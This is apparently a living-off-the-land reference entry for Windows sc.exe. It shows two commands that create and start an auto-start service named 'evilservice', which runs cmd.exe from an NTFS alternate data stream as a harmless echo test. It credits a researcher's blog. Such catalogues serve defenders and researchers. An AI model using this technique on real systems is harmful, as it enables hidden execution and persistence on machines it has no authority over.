## SC.exe
* Functions: Execute, Read ADS, Create Service, Start Service
```

sc create evilservice binPath="\"c:\\ADS\\file.txt:cmd.exe\" /c echo works > \"c:\ADS\works.txt\"" DisplayName= "evilservice" start= auto
sc start evilservice


```
   
* Resources:   
  * https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/
   
* Full path:   
  * C:\Windows\System32\sc.exe
  * C:\Windows\SysWOW64\sc.exe
   
* Notes: Thanks to Oddvar Moe - @oddvarmoe  
   
